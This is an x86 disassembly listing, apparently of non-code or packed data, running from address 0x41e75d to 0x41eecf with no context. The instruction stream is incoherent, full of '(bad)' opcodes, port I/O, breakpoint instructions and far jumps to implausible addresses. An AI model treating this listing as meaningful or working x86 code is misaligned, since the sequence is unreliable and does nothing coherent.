  41e75d:	test   DWORD PTR [ebx],edi
  41e75f:	mov    edi,0xe5bf7ae5
  41e764:	mov    dl,0x4f
  41e766:	xor    BYTE PTR [ebx],dl
  41e768:	outs   dx,BYTE PTR ds:[esi]
  41e769:	xor    cl,dh
  41e76b:	fdiv   st(2),st
  41e76d:	out    dx,al
  41e76e:	mov    bl,0x2d
  41e770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e771:	dec    DWORD PTR [edi+0x7ab795a]
  41e777:	stc    
  41e778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e779:	icebp  
  41e77a:	fpatan 
  41e77c:	mov    edi,0x4a456442
  41e781:	pop    es
  41e782:	das    
  41e783:	jmp    0x41e7e8
  41e785:	jo     0x41e791
  41e787:	push   ss
  41e788:	pop    ebp
  41e789:	pop    esp
  41e78a:	imul   ebx,DWORD PTR [eax+0x5bb02e4],0x71
  41e791:	jb     0x41e79a
  41e793:	clc    
  41e794:	jbe    0x41e769
  41e796:	mov    ebp,0x4bc958c
  41e79b:	adc    BYTE PTR [esi+0x1d8e7a79],dl
  41e7a1:	loop   0x41e7e7
  41e7a3:	loop   0x41e7bc
  41e7a5:	mov    ecx,0xff943a80
  41e7aa:	(bad)  
  41e7ab:	(bad)  
  41e7ac:	ss jge 0x41e7a8
  41e7af:	scas   al,BYTE PTR es:[edi]
  41e7b0:	test   eax,0x57be4398
  41e7b5:	jl     0x41e791
  41e7b7:	ret    
  41e7b8:	adc    BYTE PTR [ebx-0x67],ah
  41e7bb:	fild   WORD PTR [edi-0x9666546]
  41e7c1:	stos   BYTE PTR es:[edi],al
  41e7c2:	mov    dh,0x82
  41e7c4:	adc    DWORD PTR [ecx+0x59],ecx
  41e7c7:	jbe    0x41e7ad
  41e7c9:	ds jae 0x41e80b
  41e7cc:	add    eax,0x39b873e1
  41e7d1:	xchg   esp,eax
  41e7d2:	and    edx,DWORD PTR [edi+edx*4-0x70]
  41e7d6:	mov    eax,ds:0xddf416af
  41e7db:	std    
  41e7dc:	cmp    DWORD PTR [edi+eiz*8-0x30],ecx
  41e7e0:	ins    BYTE PTR es:[edi],dx
  41e7e1:	pop    ds
  41e7e2:	mov    edi,0x3a42cdc5
  41e7e7:	loope  0x41e78f
  41e7e9:	xor    al,0x83
  41e7eb:	sar    DWORD PTR [ecx],cl
  41e7ed:	sbb    BYTE PTR [ebx+0x4b73dc15],0xed
  41e7f4:	jle    0x41e801
  41e7f6:	cmc    
  41e7f7:	dec    esi
  41e7f8:	mov    esi,0xa068d1ba
  41e7fd:	pop    edx
  41e7fe:	repnz das 
  41e800:	das    
  41e801:	clc    
  41e802:	(bad)  
  41e803:	out    dx,al
  41e804:	dec    eax
  41e805:	mov    ebp,0x479baf53
  41e80a:	push   edi
  41e80b:	mov    edx,0x707a4cbb
  41e810:	dec    ecx
  41e811:	push   ebx
  41e812:	xor    BYTE PTR [ecx],0xae
  41e815:	push   eax
  41e816:	daa    
  41e817:	rol    DWORD PTR [eax+0x49],0x55
  41e81b:	xchg   esi,eax
  41e81c:	xor    ah,dl
  41e81e:	mov    ss,WORD PTR [edi]
  41e820:	jno    0x41e7bb
  41e822:	mov    esp,0xdc473145
  41e827:	pop    es
  41e828:	xchg   edi,eax
  41e829:	jne    0x41e820
  41e82b:	push   ebx
  41e82c:	mov    ch,0xff
  41e82e:	jmp    0xe004488c
  41e833:	icebp  
  41e834:	inc    ecx
  41e835:	ds scas eax,DWORD PTR es:[edi]
  41e837:	lahf   
  41e838:	pushf  
  41e839:	jg     0x41e886
  41e83b:	out    0x97,eax
  41e83d:	adc    eax,DWORD PTR [eax+ebx*1-0x18]
  41e841:	fcmovne st,st(6)
  41e843:	lock mov DWORD PTR [eax+edi*4],ecx
  41e847:	push   edi
  41e848:	sar    BYTE PTR [eax],cl
  41e84a:	int3   
  41e84b:	or     eax,0xc651704e
  41e850:	add    DWORD PTR [edi+0x7c],ebx
  41e853:	or     edx,edx
  41e855:	fwait
  41e856:	stos   BYTE PTR es:[edi],al
  41e857:	add    BYTE PTR [ecx-0x13],al
  41e85a:	ds ins BYTE PTR es:[edi],dx
  41e85c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e85d:	xchg   ecx,eax
  41e85e:	xchg   edx,eax
  41e85f:	loop   0x41e820
  41e861:	rcl    al,0xbe
  41e864:	mov    bh,ch
  41e866:	push   ss
  41e867:	inc    esp
  41e868:	call   0xf8516f52
  41e86d:	hlt    
  41e86e:	popa   
  41e86f:	test   eax,0xa7e5cc9a
  41e874:	fmul   QWORD PTR [esi+0x41]
  41e877:	mov    ebp,edx
  41e879:	push   edx
  41e87a:	dec    edi
  41e87b:	add    al,0x4e
  41e87d:	ins    BYTE PTR es:[edi],dx
  41e87e:	int3   
  41e87f:	adc    BYTE PTR [edx-0x2c],al
  41e882:	outs   dx,DWORD PTR ds:[esi]
  41e883:	pusha  
  41e884:	xchg   ecx,eax
  41e885:	test   DWORD PTR [eax],edx
  41e887:	popa   
  41e888:	mov    cl,0x69
  41e88a:	push   0x7154e58f
  41e88f:	adc    eax,0x9da1af5d
  41e894:	test   ebx,ebp
  41e896:	push   DWORD PTR [esi-0x14cbbe4c]
  41e89c:	inc    ebp
  41e89d:	aad    0xfa
  41e89f:	push   es
  41e8a0:	mov    al,ds:0xc378fdc1
  41e8a5:	mov    dh,0xae
  41e8a7:	dec    edx
  41e8a8:	iret   
  41e8a9:	xlat   BYTE PTR ds:[ebx]
  41e8aa:	popa   
  41e8ab:	pop    ebp
  41e8ac:	iret   
  41e8ad:	out    dx,eax
  41e8ae:	mov    edi,0x5ffc280b
  41e8b3:	and    cl,BYTE PTR [edi]
  41e8b5:	rcl    BYTE PTR [edi],cl
  41e8b7:	mov    ch,0x23
  41e8b9:	push   es
  41e8ba:	das    
  41e8bb:	imul   edi,DWORD PTR ds:0xe84d6cfc,0xffffffca
  41e8c2:	and    al,0x4f
  41e8c4:	xchg   eax,ebx
  41e8c6:	sbb    WORD PTR [esi+0x677cee5],si
  41e8cd:	ins    DWORD PTR es:[edi],dx
  41e8ce:	neg    edx
  41e8d0:	xchg   ecx,eax
  41e8d1:	pop    ss
  41e8d2:	xchg   ebp,eax
  41e8d3:	dec    edx
  41e8d4:	mov    edi,0xef58b757
  41e8d9:	iret   
  41e8da:	or     eax,0x3da251cc
  41e8df:	fs (bad) 
  41e8e1:	fwait
  41e8e2:	push   ebx
  41e8e3:	mov    ebp,DWORD PTR [eax-0x523b7fc8]
  41e8e9:	bswap  edx
  41e8eb:	mov    al,ds:0x99a02a71
  41e8f0:	mov    ebp,0x5c58c4ed
  41e8f5:	inc    edi
  41e8f6:	aad    0x46
  41e8f8:	pop    ds
  41e8f9:	cmp    al,0x1c
  41e8fb:	adc    bh,ch
  41e8fd:	and    eax,0x2735241e
  41e902:	fwait
  41e903:	cdq    
  41e904:	mov    al,ds:0x779a69b2
  41e909:	push   0xffffffb2
  41e90b:	mov    BYTE PTR [ecx+0x3b],cl
  41e90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e90f:	xchg   esi,eax
  41e910:	sub    eax,0xfd151763
  41e915:	jae    0x41e914
  41e917:	fwait
  41e918:	adc    bl,al
  41e91a:	mov    esi,0x43a1533a
  41e91f:	mov    esp,0xfeb984f3
  41e924:	pop    esp
  41e925:	and    al,0x1a
  41e927:	(bad)  
  41e928:	iret   
  41e929:	jo     0x41e99e
  41e92b:	mov    DWORD PTR [edi],ebp
  41e92d:	inc    edi
  41e92e:	pop    ebp
  41e92f:	pop    edi
  41e930:	rcr    BYTE PTR [ebp-0x7b49649d],1
  41e936:	pushf  
  41e937:	mov    ecx,0x5e660788
  41e93c:	test   BYTE PTR [ebx],ch
  41e93e:	pop    edi
  41e93f:	out    0xc8,al
  41e941:	fst    DWORD PTR [ebp+0x6f]
  41e944:	and    BYTE PTR [ebx-0x22],al
  41e947:	cwde   
  41e948:	xor    BYTE PTR [ecx],0x35
  41e94b:	ret    0xc23
  41e94e:	and    DWORD PTR [eax+edx*4+0x49],0x8ef955af
  41e956:	loope  0x41e90e
  41e958:	icebp  
  41e959:	and    al,0x2a
  41e95b:	(bad)  
  41e95c:	push   0xac7f2f2e
  41e961:	stos   DWORD PTR es:[edi],eax
  41e962:	push   0x1a
  41e964:	mov    es,WORD PTR [ebx-0x59983fb7]
  41e96a:	sub    eax,0x97eac4e5
  41e96f:	scas   eax,DWORD PTR es:[edi]
  41e970:	pop    ss
  41e971:	(bad)  
  41e973:	(bad)  
  41e974:	(bad)  
  41e975:	in     eax,0x46
  41e977:	mov    ds:0x15360ac6,eax
  41e97c:	adc    al,0xa7
  41e97e:	cld    
  41e97f:	or     DWORD PTR [ebp+0x7514d997],ebx
  41e985:	bound  ecx,QWORD PTR [edx+0x6d]
  41e988:	(bad)  
  41e98a:	sub    eax,0x3d8a32f4
  41e98f:	bound  edi,QWORD PTR [ebx-0x2bf6f0e6]
  41e995:	sbb    esi,esp
  41e997:	mov    eax,ds:0x63f08e2c
  41e99c:	ja     0x41e91e
  41e99e:	clc    
  41e99f:	mov    al,ds:0xb33055fb
  41e9a4:	jmp    0x41e963
  41e9a6:	cmp    DWORD PTR [esi-0x2cac9550],esi
  41e9ac:	adc    BYTE PTR [esi],dh
  41e9ae:	bound  edx,QWORD PTR [eax-0x7425934e]
  41e9b4:	push   0xffffffb2
  41e9b6:	test   al,0xe8
  41e9b8:	fs push ss
  41e9ba:	mov    ebp,0x1457e81
  41e9bf:	mov    ds:0xf1b6e23a,al
  41e9c4:	mov    edi,0xf9edf45a
  41e9c9:	pushf  
  41e9ca:	rcr    DWORD PTR [eax],1
  41e9cc:	(bad)  
  41e9cd:	ficom  WORD PTR [edi*2-0x6b900d55]
  41e9d4:	mov    eax,DWORD PTR [eax+0x29cb60f]
  41e9da:	int3   
  41e9db:	push   esp
  41e9dc:	out    0x28,al
  41e9de:	sahf   
  41e9df:	in     al,0x61
  41e9e1:	dec    eax
  41e9e2:	dec    eax
  41e9e3:	mov    bh,0x7c
  41e9e5:	jnp    0x41e9fe
  41e9e7:	mov    dl,0x5b
  41e9e9:	push   ds
  41e9ea:	push   ebx
  41e9eb:	int    0x78
  41e9ed:	cs push ebx
  41e9ef:	mov    eax,0x4b734466
  41e9f4:	dec    ecx
  41e9f5:	ud1    ebx,DWORD PTR [ecx]
  41e9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f9:	sbb    BYTE PTR [ebx-0x80],0x1a
  41e9fd:	cmp    DWORD PTR [edi+0x53d02a0d],ebp
  41ea03:	dec    edx
  41ea04:	xchg   edi,eax
  41ea05:	mov    bl,0x1a
  41ea07:	imul   edi,edi,0x58
  41ea0a:	scas   eax,DWORD PTR es:[edi]
  41ea0b:	lahf   
  41ea0c:	fs mov bh,0x97
  41ea0f:	mov    BYTE PTR [edx-0xd3b5009],cl
  41ea15:	les    ecx,FWORD PTR [ebx]
  41ea17:	sti    
  41ea18:	and    al,0x9b
  41ea1a:	(bad)  
  41ea1b:	rcr    DWORD PTR ds:0x188bd1b2,cl
  41ea21:	add    ebx,0x10cec42f
  41ea27:	mov    ebx,0xa382df0
  41ea2c:	inc    eax
  41ea2d:	fsubr  QWORD PTR [ebx-0x64]
  41ea30:	dec    DWORD PTR [edx]
  41ea32:	dec    esp
  41ea33:	test   DWORD PTR [ebx+0x4d],esi
  41ea36:	inc    ecx
  41ea37:	and    al,0xf0
  41ea39:	loopne 0x41ea71
  41ea3b:	cmc    
  41ea3c:	rcl    ch,0x9
  41ea3f:	push   cs
  41ea40:	jg     0x41ea84
  41ea42:	(bad)
  41ea45:	sbb    DWORD PTR [ecx+0x6555ea43],edx
  41ea4b:	shr    BYTE PTR [edx+0x437daae0],1
  41ea51:	ror    DWORD PTR ds:0xb3a70118,cl
  41ea57:	pop    ecx
  41ea58:	dec    ebx
  41ea59:	xchg   edi,eax
  41ea5a:	rcl    DWORD PTR [ebp-0x40],0x1c
  41ea5e:	mov    ch,0xc1
  41ea60:	jno    0x41ea0f
  41ea62:	mov    ah,0x70
  41ea64:	mov    al,ds:0x19fb5bfe
  41ea69:	int3   
  41ea6a:	stos   BYTE PTR es:[edi],al
  41ea6b:	lahf   
  41ea6c:	rcr    BYTE PTR [edi+0x15],0xee
  41ea70:	out    dx,eax
  41ea71:	dec    edi
  41ea72:	and    ebp,ebp
  41ea74:	adc    BYTE PTR [eax-0x79],0xd
  41ea78:	push   es
  41ea79:	mov    edx,0xd160df41
  41ea7e:	lods   al,BYTE PTR ds:[esi]
  41ea7f:	das    
  41ea80:	and    eax,0xc393e72d
  41ea85:	cmp    ah,BYTE PTR [ebp-0x3e]
  41ea88:	pop    edx
  41ea89:	dec    ecx
  41ea8a:	xor    DWORD PTR [ebx],0xffffff82
  41ea8d:	or     DWORD PTR [ecx+0x25907b6],ebx
  41ea93:	pop    edi
  41ea94:	ins    BYTE PTR es:[edi],dx
  41ea95:	adc    al,0xeb
  41ea97:	imul   ecx,DWORD PTR [eax],0x8af5ffe6
  41ea9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea9e:	adc    BYTE PTR [ecx],0x83
  41eaa1:	mov    ?,WORD PTR [ecx+eax*2-0x34]
  41eaa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaa6:	jmp    0x2c6e:0xca58802
  41eaad:	rol    esi,cl
  41eaaf:	out    dx,al
  41eab0:	jecxz  0x41eb27
  41eab2:	outs   dx,DWORD PTR ds:[esi]
  41eab3:	aad    0x9c
  41eab5:	sbb    edi,esp
  41eab7:	pop    edx
  41eab8:	repnz adc al,0x45
  41eabb:	jne    0x41eae8
  41eabd:	inc    ebx
  41eabe:	or     eax,0x363414f9
  41eac3:	stc    
  41eac4:	sbb    esi,eax
  41eac6:	sbb    ecx,0xffffffe2
  41eac9:	fs cmp eax,0xd9774b2c
  41eacf:	ss stos DWORD PTR es:[edi],eax
  41ead1:	ret    0xec1d
  41ead4:	adc    BYTE PTR [ebx+edx*8],al
  41ead7:	ret    0x6fd3
  41eada:	inc    esi
  41eadb:	push   edi
  41eadc:	das    
  41eadd:	inc    eax
  41eade:	fsubr  QWORD PTR ds:0xc823ca3c
  41eae4:	scas   eax,DWORD PTR es:[edi]
  41eae5:	(bad)  
  41eae6:	jno    0x41eaff
  41eae8:	test   DWORD PTR [ebx+0x6c],esp
  41eaeb:	add    ah,bh
  41eaed:	jnp    0x41ea7f
  41eaef:	sti    
  41eaf0:	jns    0x41eb4e
  41eaf2:	sbb    eax,0x6d50a65a
  41eaf7:	inc    esp
  41eaf8:	and    BYTE PTR [edi-0xe],ah
  41eafb:	sbb    ebx,DWORD PTR [ebx+esi*2-0x17a511aa]
  41eb02:	aaa    
  41eb03:	mov    ebp,?
  41eb05:	test   DWORD PTR ds:0x38d0430b,edx
  41eb0b:	and    eax,0x611939ee
  41eb10:	(bad)  
  41eb11:	and    BYTE PTR [esi],al
  41eb13:	scas   al,BYTE PTR es:[edi]
  41eb14:	sahf   
  41eb15:	or     eax,0x968fa67d
  41eb1a:	xor    eax,ebx
  41eb1c:	inc    ebx
  41eb1d:	or     eax,0xcfdad7fb
  41eb22:	das    
  41eb23:	fiadd  DWORD PTR [esi]
  41eb25:	lea    edi,[edx+0x1174097a]
  41eb2b:	nop
  41eb2c:	aam    0x82
  41eb2e:	pop    edx
  41eb2f:	rcl    ch,1
  41eb31:	push   esi
  41eb32:	dec    ebp
  41eb33:	mov    bh,0xdb
  41eb35:	xchg   edi,eax
  41eb36:	add    eax,0x4f667b01
  41eb3b:	jle    0x41eadc
  41eb3d:	loope  0x41eadd
  41eb3f:	arpl   WORD PTR fs:[esp+ebx*4],bx
  41eb43:	jecxz  0x41eb47
  41eb45:	ds dec ebp
  41eb47:	cmp    ah,BYTE PTR [ecx+0x407cd11e]
  41eb4d:	push   eax
  41eb4e:	push   cs
  41eb4f:	das    
  41eb50:	inc    eax
  41eb51:	push   ebx
  41eb53:	xchg   ecx,eax
  41eb54:	mov    edi,?
  41eb56:	leave  
  41eb57:	jge    0x41eb1d
  41eb59:	(bad)  ss:[esi]
  41eb5c:	pop    edi
  41eb5d:	lock (bad) 
  41eb5f:	into   
  41eb60:	jecxz  0x41eb23
  41eb62:	cli    
  41eb63:	stos   DWORD PTR es:[edi],eax
  41eb64:	xchg   edi,eax
  41eb65:	dec    ebx
  41eb67:	jg     0x41eb47
  41eb69:	(bad)  
  41eb6a:	call   0x8968:0xdb92c6c0
  41eb71:	pop    ebx
  41eb72:	loop   0x41ebba
  41eb74:	in     al,dx
  41eb75:	aaa    
  41eb76:	or     eax,edi
  41eb78:	addr16 add eax,0x5decd1f
  41eb7e:	and    eax,0x63eb0bfb
  41eb83:	adc    eax,0xdb1c3bf4
  41eb88:	or     eax,esi
  41eb8a:	add    al,0xe5
  41eb8c:	push   ebp
  41eb8d:	push   esp
  41eb8e:	inc    eax
  41eb8f:	and    bl,BYTE PTR [ecx-0x7]
  41eb92:	cmp    ebp,DWORD PTR ds:0x362fa267
  41eb98:	cmp    al,BYTE PTR [ebx+0x8]
  41eb9b:	push   0xc6ced5ea
  41eba0:	xchg   ebx,eax
  41eba1:	ret    
  41eba2:	mov    eax,ds:0x150b0efc
  41eba7:	adc    eax,0xff880953
  41ebac:	daa    
  41ebad:	or     edi,0xffffffc9
  41ebb0:	and    DWORD PTR [eax],0x9bcdc252
  41ebb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebb7:	inc    ebp
  41ebb8:	add    cl,BYTE PTR [esi+0x276310b7]
  41ebbe:	mov    eax,ds:0x1a358d83
  41ebc3:	popa   
  41ebc4:	jns    0x41ebb1
  41ebc6:	xchg   BYTE PTR [esi-0x51a083f5],bl
  41ebcc:	loope  0x41eb9c
  41ebce:	or     DWORD PTR [ecx+0x978dc25],eax
  41ebd4:	fld    st(4)
  41ebd6:	cwde   
  41ebd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebd8:	test   eax,0x2b23e2aa
  41ebdd:	inc    ebx
  41ebde:	arpl   WORD PTR [ebx+ebx*1-0x3a663906],ax
  41ebe5:	fs dec esp
  41ebe7:	pop    esi
  41ebe8:	mov    al,ds:0x320380f8
  41ebed:	pushf  
  41ebee:	pop    edx
  41ebef:	cli    
  41ebf0:	retw   
  41ebf2:	add    BYTE PTR [esp+ebp*2+0xea61da8],bh
  41ebf9:	sbb    esi,ebx
  41ebfb:	pusha  
  41ebfc:	pop    ecx
  41ebfd:	stc    
  41ebfe:	push   ebx
  41ebff:	imul   esp,eax,0x15
  41ec02:	add    ebx,0xb7f38078
  41ec08:	mov    ecx,0x70d35698
  41ec0d:	repnz and esp,edi
  41ec10:	push   es
  41ec11:	mov    ebx,0xb77990d
  41ec16:	cmp    dh,BYTE PTR [esi+0x1e]
  41ec19:	xchg   esp,eax
  41ec1a:	pop    es
  41ec1b:	bound  esp,QWORD PTR [edi-0x31e86be4]
  41ec21:	inc    edi
  41ec22:	daa    
  41ec23:	adc    esp,DWORD PTR [edx-0x2bf743ea]
  41ec29:	jno    0x41ec18
  41ec2b:	adc    eax,0x9e85053b
  41ec30:	aam    0x32
  41ec32:	cs push 0x5df47657
  41ec38:	xlat   BYTE PTR ds:[ebx]
  41ec39:	or     ah,BYTE PTR [eax+esi*2+0x23]
  41ec3d:	int3   
  41ec3e:	inc    esp
  41ec3f:	xchg   edx,eax
  41ec40:	mov    al,0x7f
  41ec42:	ja     0x41ec3c
  41ec44:	test   al,0xe
  41ec46:	pushf  
  41ec47:	repnz mov dh,0x20
  41ec4a:	in     eax,dx
  41ec4b:	shr    BYTE PTR [ebx+0x18],0x97
  41ec4f:	sahf   
  41ec50:	lods   al,BYTE PTR ds:[esi]
  41ec51:	inc    edi
  41ec52:	fidiv  DWORD PTR [edx-0x48cf7106]
  41ec58:	cmp    eax,0xccc832d3
  41ec5d:	mov    al,ds:0x95c74082
  41ec62:	lds    edi,FWORD PTR [ebx-0x1e]
  41ec65:	sub    BYTE PTR [esi],dl
  41ec67:	lahf   
  41ec68:	pop    eax
  41ec69:	and    eax,0x768c078b
  41ec6e:	jne    0x41ec5e
  41ec70:	adc    esp,DWORD PTR [esi]
  41ec72:	mov    esp,0x8203ac82
  41ec77:	push   dx
  41ec79:	lock in eax,dx
  41ec7b:	inc    DWORD PTR [edi+0x43a79145]
  41ec81:	push   esp
  41ec82:	leave  
  41ec83:	mov    DWORD PTR [edx-0x62],0x23520b6f
  41ec8a:	cmp    edi,DWORD PTR [edi]
  41ec8c:	loope  0x41ec48
  41ec8e:	push   ebx
  41ec8f:	call   0xee4c:0x6627e2d0
  41ec96:	mov    edx,DWORD PTR [edi+esi*8-0x43447f45]
  41ec9d:	mov    dl,0xa9
  41ec9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eca0:	inc    edx
  41eca1:	pop    ds
  41eca2:	cdq    
  41eca3:	popf   
  41eca4:	mov    es,WORD PTR [ebx+0x73d2a297]
  41ecaa:	inc    esp
  41ecab:	xchg   edx,eax
  41ecac:	enter  0xd680,0xe9
  41ecb0:	pop    es
  41ecb1:	mov    dl,0x12
  41ecb3:	enter  0x8287,0xe0
  41ecb7:	(bad)  
  41ecb8:	dec    ebx
  41ecb9:	dec    edx
  41ecba:	(bad)  
  41ecbb:	pop    ebx
  41ecbc:	push   ds
  41ecbd:	sahf   
  41ecbe:	cld    
  41ecbf:	sub    eax,0x46dfa56b
  41ecc4:	sub    dl,cl
  41ecc6:	das    
  41ecc7:	push   esp
  41ecc8:	inc    esp
  41ecc9:	aam    0x29
  41eccb:	mov    ch,0x2d
  41eccd:	mov    edx,0xdad05741
  41ecd2:	adc    ebx,0x19
  41ecd5:	pop    eax
  41ecd6:	shl    al,0xd6
  41ecd9:	shl    DWORD PTR [edi-0x2c],0x83
  41ecdd:	pop    edi
  41ecde:	(bad)  
  41ecdf:	jns    0x41ed42
  41ece1:	imul   edx,DWORD PTR [eax-0x6],0xa6ee9e01
  41ece8:	retf   0x43de
  41eceb:	and    al,bl
  41eced:	dec    ebx
  41ecee:	jp     0x41ed2d
  41ecf0:	call   0x3e78cd01
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	mov    ebp,DWORD PTR [esi+0x39]
  41ecf9:	rcl    BYTE PTR [ebx-0x6f2c412],cl
  41ecff:	rcr    BYTE PTR [eax],0xbe
  41ed02:	(bad)  
  41ed03:	not    BYTE PTR [eax]
  41ed05:	nop
  41ed06:	fwait
  41ed07:	outs   dx,BYTE PTR ds:[esi]
  41ed08:	and    DWORD PTR [edi+0x33],ebx
  41ed0b:	inc    ecx
  41ed0c:	xchg   ebx,eax
  41ed0d:	push   es
  41ed0e:	mov    bl,0x57
  41ed10:	mov    al,ds:0x5b46073d
  41ed15:	loop   0x41ecc2
  41ed17:	fidivr WORD PTR [esi-0x64]
  41ed1a:	pop    ds
  41ed1b:	or     al,ch
  41ed1d:	jnp    0x41ecdf
  41ed1f:	js     0x41ed04
  41ed21:	jp     0x41ed26
  41ed23:	test   DWORD PTR [esi+0x37],esi
  41ed26:	jns    0x41ed54
  41ed28:	add    eax,0x73a105af
  41ed2d:	jle    0x41ecc1
  41ed2f:	jo     0x41ed89
  41ed31:	mov    bl,0xa3
  41ed33:	cdq    
  41ed34:	mov    eax,0x81e79d8c
  41ed39:	push   ebx
  41ed3a:	fwait
  41ed3b:	mov    ch,0x28
  41ed3d:	arpl   WORD PTR [edi-0x36c5659c],dx
  41ed43:	jge    0x41ed73
  41ed45:	mov    gs,WORD PTR [edx+0x18]
  41ed48:	mov    eax,DWORD PTR [edi-0x1]
  41ed4b:	mov    edi,0x39215810
  41ed50:	not    cl
  41ed52:	mov    eax,0x184387b2
  41ed57:	icebp  
  41ed58:	retf   0x26bc
  41ed5b:	imul   eax,DWORD PTR [esi-0x68],0x32
  41ed5f:	mov    ah,0x45
  41ed61:	pop    esp
  41ed62:	out    0xcd,al
  41ed64:	add    bl,ah
  41ed66:	mov    bh,0xac
  41ed68:	(bad)  
  41ed69:	les    edx,FWORD PTR ds:0x83d671ec
  41ed6f:	pop    ds
  41ed70:	adc    DWORD PTR [esi],ebp
  41ed72:	iret   
  41ed73:	sbb    BYTE PTR [eax-0x9],dl
  41ed76:	jl     0x41ed09
  41ed78:	dec    edi
  41ed79:	sbb    ebp,DWORD PTR [ebx]
  41ed7b:	ficom  WORD PTR [edx+0x7c84b049]
  41ed81:	cmp    eax,0xc81c6a05
  41ed86:	fsubp  st(3),st
  41ed88:	push   ebp
  41ed89:	mov    ds,WORD PTR [ebp+0x7a]
  41ed8c:	and    bl,BYTE PTR [edi+0x8e639f6]
  41ed92:	loopne 0x41ed14
  41ed94:	push   es
  41ed95:	xchg   ecx,eax
  41ed96:	loopne 0x41ee06
  41ed98:	leave  
  41ed99:	sbb    cl,al
  41ed9b:	adc    DWORD PTR [esi-0x3b],ebp
  41ed9e:	mov    edx,0x2a9d311d
  41eda3:	pop    ebp
  41eda4:	inc    eax
  41eda5:	enter  0xc248,0x9c
  41eda9:	xchg   ebp,eax
  41edaa:	sbb    ebx,DWORD PTR [edx+ecx*8]
  41edad:	retf   
  41edae:	xchg   ecx,eax
  41edaf:	adc    eax,DWORD PTR [eax+0x2c008536]
  41edb5:	repnz (bad) 
  41edb7:	cmp    BYTE PTR [esi],bl
  41edb9:	cmp    esi,DWORD PTR [ebp+edi*8+0x4bf539f6]
  41edc0:	sti    
  41edc1:	rcl    di,cl
  41edc4:	ja     0x41ee03
  41edc6:	push   edx
  41edc7:	pushf  
  41edc8:	inc    esi
  41edc9:	jo     0x41ee01
  41edcb:	mov    bl,0xc2
  41edcd:	les    ecx,FWORD PTR [ebx-0x20f30df]
  41edd3:	outs   dx,BYTE PTR ds:[esi]
  41edd4:	adc    BYTE PTR [esi+0x19],al
  41edd7:	pop    esi
  41edd8:	xchg   ebx,eax
  41edd9:	nop
  41edda:	mov    esp,0x4fd26ec0
  41eddf:	sub    al,0x1a
  41ede1:	scas   eax,DWORD PTR es:[edi]
  41ede2:	mov    ds:0x6b8e64c5,eax
  41ede7:	enter  0x488d,0x3e
  41edeb:	and    eax,DWORD PTR [ebx+0x50f276d8]
  41edf1:	lods   eax,DWORD PTR ds:[esi]
  41edf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edf3:	loopne 0x41edd5
  41edf5:	sub    cl,BYTE PTR [edi-0x4a]
  41edf8:	lock mov cl,0x7a
  41edfb:	(bad)  
  41edfc:	xor    DWORD PTR [ecx-0x3384e2c5],ebp
  41ee02:	stos   DWORD PTR es:[edi],eax
  41ee03:	pop    esi
  41ee04:	lds    edx,FWORD PTR ds:0x73c55d3c
  41ee0a:	pop    ebx
  41ee0b:	pop    ecx
  41ee0c:	jae    0x41ee84
  41ee0e:	pop    ebp
  41ee0f:	ins    DWORD PTR es:[edi],dx
  41ee10:	jmp    0xd853d322
  41ee15:	and    al,0x4c
  41ee17:	stc    
  41ee18:	popf   
  41ee19:	push   edx
  41ee1a:	push   0xffffff87
  41ee1c:	(bad)  
  41ee1d:	jp     0x41ee26
  41ee1f:	push   eax
  41ee20:	pop    ebx
  41ee21:	xor    BYTE PTR [esi+0x2df153a7],0xf1
  41ee28:	or     ch,BYTE PTR [edx]
  41ee2a:	mov    eax,0xda9e6296
  41ee2f:	pop    ebp
  41ee30:	mov    bh,0x79
  41ee32:	shr    DWORD PTR [ebp-0xa897e75],1
  41ee38:	test   al,0xd5
  41ee3a:	push   ds
  41ee3b:	adc    DWORD PTR [ecx],edi
  41ee3d:	adc    BYTE PTR [ebp-0xeb80522],ah
  41ee43:	jecxz  0x41eeb0
  41ee45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee46:	dec    ebp
  41ee47:	sbb    BYTE PTR [esp+eiz*8-0x25fe91ac],0x5b
  41ee4f:	or     BYTE PTR [esi],bl
  41ee51:	mov    WORD PTR ss:[eax+edi*4+0x52],?
  41ee56:	bswap  edi
  41ee58:	js     0x41eeb8
  41ee5a:	xor    dl,BYTE PTR [edx+0x66ad5d2a]
  41ee60:	jmp    0x41ee88
  41ee62:	fs pop edx
  41ee64:	ja     0x41ee1d
  41ee66:	cli    
  41ee67:	ins    DWORD PTR es:[edi],dx
  41ee68:	xchg   DWORD PTR [esi-0x3c4b96a5],ebp
  41ee6e:	enter  0x7965,0x7c
  41ee72:	or     al,0x64
  41ee74:	cs adc eax,0xadad6aac
  41ee7a:	pop    edx
  41ee7b:	shl    BYTE PTR [ecx-0x66],0xeb
  41ee7f:	icebp  
  41ee80:	fmul   DWORD PTR [esi+0x6c6f5a70]
  41ee86:	sub    DWORD PTR [eax],edi
  41ee88:	or     ah,BYTE PTR [esi+0x47ca1f26]
  41ee8e:	sub    eax,0x9eaec1e
  41ee93:	cs dec esp
  41ee95:	xor    edx,ebp
  41ee97:	cld    
  41ee98:	lahf   
  41ee99:	jnp    0x41ee52
  41ee9b:	push   eax
  41ee9c:	jnp    0x41eeae
  41ee9e:	or     DWORD PTR [eax],eax
  41eea0:	idiv   DWORD PTR [ecx]
  41eea2:	inc    ecx
  41eea3:	popa   
  41eea4:	add    DWORD PTR [edi-0x3b1a9599],edx
  41eeaa:	xor    DWORD PTR [edx+0x1a],ebx
  41eead:	xor    BYTE PTR cs:[ecx+0x48bcd748],cl
  41eeb4:	call   0xd97730b2
  41eeb9:	mov    ebx,0x47a09921
  41eebe:	bound  edx,QWORD PTR [edx+0x76]
  41eec1:	push   ebx
  41eec2:	call   0x8534:0xf1726208
  41eec9:	jmp    0x5d9f0e04
  41eece:	pop    ss
  41eecf:	shr    DWORD PTR [eax+0x33],0xaa
